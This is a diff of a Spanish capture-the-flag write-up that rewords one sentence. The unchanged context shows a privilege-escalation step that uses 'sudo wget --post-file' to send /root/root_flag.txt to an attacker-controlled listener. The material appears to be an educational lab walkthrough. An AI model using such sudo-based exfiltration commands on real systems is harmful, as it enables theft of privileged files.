@@ -101,7 +101,7 @@ Una vez que la escucha está activa, podemos utilizar el comando **wget** junto 
 <pre data-line-numbers><code><strong>sudo /usr/bin/wget --post-file=/root/root_flag.txt http://{ip_local}:4445
 </strong></code></pre>
 
-Esperamos a que se establezca la conexión y observamos que nuestra máquina local ha recibido el contenido del archivo **root\_flag.txt**, el cual contiene la respuesta para nuestra última bandera.
+Esperamos a que se establezca la conexión, después observamos que nuestra máquina local ha recibido el contenido del archivo **root\_flag.txt** y nos muestra la respuesta para nuestra última bandera.
 
 <figure><img src="../../.gitbook/assets/image-20230712095837023.png" alt=""><figcaption></figcaption></figure>
 
